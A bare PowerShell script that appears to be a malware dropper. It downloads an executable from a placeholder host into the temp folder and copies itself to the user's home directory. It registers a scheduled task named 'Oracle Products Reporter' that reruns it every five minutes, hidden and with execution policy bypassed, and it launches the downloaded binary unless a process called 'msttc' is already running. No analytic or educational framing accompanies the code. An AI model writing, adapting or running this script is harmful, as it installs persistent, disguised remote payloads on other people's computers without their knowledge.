$me = $MyInvocation.MyCommand.Path
$murl = "http://SITE/synclog"
$moutput = "$env:TMP\synclog.exe"
$localS = "$HOME\schtasks.ps1"
$localT = "$env:TMP\xiepl.exe"
$wc = New-Object System.Net.WebClient
if(!(Test-Path $localT)) {
  $wc.DownloadString("http://SITE/red")
  $wc.DownloadFile($murl, $moutput)
}
copy $me $localS
copy $moutput $localT
SchTasks.exe /Create /F /SC MINUTE /MO 5 /TN "Oracle Products Reporter" /TR "PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -File $localS"
if(!(Get-Process msttc -ErrorAction SilentlyContinue)) {
    cmd.exe /C $localT
} else {
    exit
}
exit